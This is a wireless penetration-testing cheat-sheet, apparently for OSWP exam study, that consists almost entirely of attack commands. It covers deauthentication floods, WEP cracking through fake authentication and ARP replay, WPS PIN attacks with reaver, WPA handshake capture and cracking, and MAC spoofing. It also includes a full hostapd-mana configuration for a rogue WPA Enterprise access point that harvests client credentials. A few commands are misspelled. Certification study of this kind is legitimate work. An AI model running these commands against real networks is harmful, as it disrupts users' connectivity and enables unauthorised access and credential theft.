# OSWP Cheat-sheet

## Monitoring
### Find all AP and connected devices
```
airodump-ng <interface> --wps --manufacturer --uptime --band <band>
```

### Monitor target AP
```
airodump-ng <interface> --wps --manufacturer --uptime --band <band> -c <channel> --bssid <bssid> -w <capture>
```
### Unhide ESSID
Set channel
```
iwconfig wlan0 channel <channel>
```
Catch beacon with ESSID (Hiden ESSID)
```
aireplay-ng -0 <deauth number> -a <AP MAC> <interface> 
aireplay-ng -0 <deauth number> -a <AP MAC> -c <Client MAC> <interface> #Some clients ignore broadcast deauthentications. If this is the case, you will need to send a deauthentication directed at the particular client.
```


## WEP attack

### Attack using Fake auth and ARP-replay (OPN)
```
aireplay-ng -1 60 -a <AP_MAC> -h <host_MAC> <interface> # Fake auth
aireplay-ng -3 -b <AP_MAC> -h <host_MAC> <interface> # ARP replay
aircrack-ng <*.cap>
```
### Interactive packet Replay (OPN)
```
aireplay-ng -1 60 -a <AP_MAC> -h <host_MAC> <interface> # Fake auth
aireplay-ng -2 -b <AP_MAC> -d ff:ff:ff:ff:ff:ff <interface>

```

## WPS attack
**Dependencies:** reaver

_Some APs have protections. AP might have PIN timeout after a series of failures. These APs then require either a timeout or a reset to remove the lock._

### Custom PIN association 
 
### Pixie Dust attack 
```
 reaver -i <interface> -b <AP_MAC> -K
```
 
### Bruteforce PIN attack 
```
sudo reaver -i <interface> -b <AP_MAC>
```
 
### Known PINs attack
```
reaver -i <interface> -b <AP_MAC> -p <PIN>
```
 
### Null PIN attack 
_Only a very few APs are vulnerable to this attack_
```
reaver -i <interface> -b <AP_MAC> -p "" -N
```

## WPA attack
### Handshake Capture (req. client) & Cracking
```
airdump-ng -c <channel> --bssid <AP_MAC> -w <capture> <interface>
aircrack-ng -a 2 -b <AP_MAC> -w <wordlist> <capture>
```

## WPA Enterprise



## Connect to AP

### Open
```
iw <interface> connect <ESSID>
dhclient <interface>
```

### WEP
```
iw <interface> connect <ESSID> key 0:<key>
dhclient <interface>
```

### WPA2

Dependencies: wpasupplicant
```

wpa_passphrase "<ESSID>" <key> | sudo tee /etc/wpa_supplicant.conf
wpa_supplicant -B -c /etc/wpa_supplicant.conf -i <interface>
dhclient <interface>
```

### WPA enterprise

```
# SSID of the AP
ssid=Amaze_LLC

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan1
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```



mana.eap_user
```
*     PEAP,TTLS,TLS,FAST,MD5,GTC
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```


```
sudo dhclient <interface>
```

## Other
### MAC-spoofing
```
ip link set dev <interface> down
ip link set dev <interface> address <XX:XX:XX:XX:XX:XX>
ip link set dev <interface> up
```
### Prepare Attacker PC (Monitor mode)
```
airmon-ng check kill
airmon-ng start <interface>
OR
iw dev <interface> set monitor none
```
### Back to normal modee (Managed mode)
```
airmon-ng stop <Monitor interface>
systemctl start wpa_supplicant
systemctl start NetworkManager
```
### No associated devices
```
aireply-ng -0 100 -e <ESSID> <interface>
```
